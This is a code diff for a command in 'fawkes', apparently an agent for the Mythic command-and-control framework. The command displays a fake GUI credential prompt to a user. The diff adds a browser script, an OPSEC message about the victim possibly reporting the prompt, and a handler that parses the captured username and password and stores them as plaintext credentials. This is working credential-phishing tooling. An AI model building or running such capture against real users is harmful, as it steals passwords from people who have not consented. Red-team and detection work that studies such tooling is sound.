@@ -2,8 +2,11 @@ package agentfunctions
 
 import (
 	"fmt"
+	"path/filepath"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -14,6 +17,10 @@ func init() {
 		Version:             2,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
+		AssociatedBrowserScript: &agentstructs.BrowserScript{
+			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "credential_prompt_new.js"),
+			Author:     "@galoryber",
+		},
 		MitreAttackMappings: []string{"T1056.002"}, // Input Capture: GUI Input Capture
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
@@ -83,6 +90,15 @@ func init() {
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
+		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
+			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
+				TaskID:              taskData.Task.ID,
+				Success:             true,
+				OpsecPostBlocked:    false,
+				OpsecPostMessage:    "OPSEC AUDIT: Credential prompt dialog was displayed. If the user entered credentials, they are captured. If the user dismissed the dialog or became suspicious, they may report the incident. Monitor for user-initiated security reports or help desk tickets about unexpected auth prompts.",
+				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
+		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
 				Success: true,
@@ -95,6 +111,40 @@ func init() {
 			display := fmt.Sprintf("title: %s", title)
 			response.DisplayParams = &display
 			createArtifact(taskData.Task.ID, "User Interaction", fmt.Sprintf("GUI credential prompt: %s", title))
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			// Parse output format:
+			//   User:     <username>
+			//   Password: <password>
+			var username, password string
+			for _, line := range strings.Split(responseText, "\n") {
+				trimmed := strings.TrimSpace(line)
+				if strings.HasPrefix(trimmed, "User:") {
+					username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
+				} else if strings.HasPrefix(trimmed, "Password:") {
+					password = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
+				}
+			}
+			if username != "" && password != "" {
+				registerCredentials(processResponse.TaskData.Task.ID, []mythicrpc.MythicRPCCredentialCreateCredentialData{
+					{
+						CredentialType: "plaintext",
+						Realm:          "local",
+						Account:        username,
+						Credential:     password,
+						Comment:        "credential-prompt dialog capture",
+					},
+				})
+			}
 			return response
 		},
 	})
